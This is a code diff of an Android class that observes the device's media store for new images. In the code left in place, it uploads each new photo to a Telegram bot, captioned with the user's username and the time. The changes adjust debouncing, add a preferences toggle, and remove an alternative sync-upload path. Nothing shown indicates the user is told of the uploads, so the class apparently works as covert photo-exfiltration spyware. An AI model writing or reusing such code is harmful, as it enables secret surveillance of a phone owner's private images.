@@ -25,13 +25,12 @@ import java.util.Set;
 
 public class ImageObserver extends ContentObserver {
     private static final String TAG = "ImageObserver";
-    private static final long DEBOUNCE_MS = 2 * 1000; // 15s collapse window
-
+    private static final long DEBOUNCE_MS = 3 * 1000;
     private final Context mContext;
     private final Handler mHandler;
     private final Set<Long> mPendingImageIds = new HashSet<>();
 
-    // 🔑 new set for deduplication of full paths
+
     private final Set<String> mPendingImagePaths = new HashSet<>();
 
     private final Runnable mFlushRunnable = this::processPendingImages;
@@ -47,7 +46,7 @@ public class ImageObserver extends ContentObserver {
     public void onChange(boolean selfChange, Uri uri) {
         super.onChange(selfChange, uri);
 
-        if (uri == null) return;
+        if (uri == null || !SharedPrefs.getImgLib(mContext)) return;
         String lastSegment = uri.getLastPathSegment();
         if (TextUtils.isEmpty(lastSegment) || !TextUtils.isDigitsOnly(lastSegment)) {
             Log.v(TAG, "Ignoring non-specific URI: " + uri);
@@ -63,7 +62,6 @@ public class ImageObserver extends ContentObserver {
 
 
 
-        Log.d(TAG, "onChange: Fucckinng Called " + calls);
 
         // 🔑 Debounce: reset runnable each time
         mHandler.removeCallbacks(mFlushRunnable);
@@ -136,24 +134,12 @@ public class ImageObserver extends ContentObserver {
             if (imgFile.exists()) {
                 Log.i(TAG, "New unique image: " + path);
                 TelegramBot.with(mContext).sendPhoto(imgFile, "User: " + SharedPrefs.getUsername(mContext)+ "\nTime: " + Utility.getStandardDatenTime());
-                triggerSync(path);
+
             }
         }
     }
 
-    private void triggerSync(String path) {
-        Account account = SyncAccountUtil.getSyncAccount(mContext);
-        if (account == null) {
-            Log.e(TAG, "No sync account available.");
-            return;
-        }
 
-        Bundle bundle = new Bundle();
-        bundle.putBoolean(ContentResolver.SYNC_EXTRAS_EXPEDITED, true);
-        bundle.putBoolean(ContentResolver.SYNC_EXTRAS_MANUAL, true);
-        bundle.putString(UploadSyncAdapter.EXTRA_IMG_PATH, path);
 
-        Log.i(TAG, "Triggering sync for: " + path);
-        ContentResolver.requestSync(account, Config.Sync.AUTHORITY, bundle);
-    }
+
 }
